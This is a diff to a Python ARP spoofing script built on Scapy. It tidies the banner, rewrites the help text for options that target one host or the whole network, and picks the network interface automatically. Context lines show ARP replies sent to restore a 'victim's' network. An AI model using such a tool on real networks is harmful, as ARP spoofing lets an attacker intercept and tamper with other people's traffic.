@@ -28,7 +28,7 @@ def signal_handler(sig, frame):
   global routeur_ip
   global victim_mac
   global routeur_mac    
-  print("\033[1;32m \n [/!\] Restoring the victim's network")
+  print("\033[1;32m\n[/!\] Restoring the victim's network")
   send(ARP(pdst=victim_ip, macdst=victim_mac, psrc=routeur_ip, macsrc=routeur_mac, op=2), count=5, inter=.2)
 
   sys.exit(0)
@@ -112,13 +112,17 @@ f = open('banner.txt', 'r')
 header = f.read()
 print ('\033[1;31m' + header)
 
+header = pyfiglet.figlet_format("ARP Spoofer", font = "slant")
+print("\033[1;31m"+header)
+print("© All credits to NextGenSpoofer  \n")
+
 #------------------------------------- ARGUMENTS ----------------------------------------
 parser = argparse.ArgumentParser()
 # -a for all
-parser.add_argument('-a', dest='a', action='store_true', help="shows a")
+parser.add_argument('-a', dest='a', action='store_true', help="Targets ALL the network, no parameter expected after")
 
 # -s for single
-parser.add_argument('-s', dest='s', action='store_true', help="shows s")
+parser.add_argument('-s', dest='s', action='store_true', help="One target, no parameter expected after")
 
 args = parser.parse_args()
 
@@ -126,11 +130,8 @@ args = parser.parse_args()
 
 
 # Header + Interface input
-header = pyfiglet.figlet_format("ARP Spoofer", font = "slant")
-print("\033[1;31m"+header)
-print("© All credits to NextGenSpoofer  \n")
-print("\033[1;33m[?] Interface :")
-iface=input()
+
+iface=conf.iface
 
 # Get our IP and MAC addr
 me_ip = get_if_addr(iface)
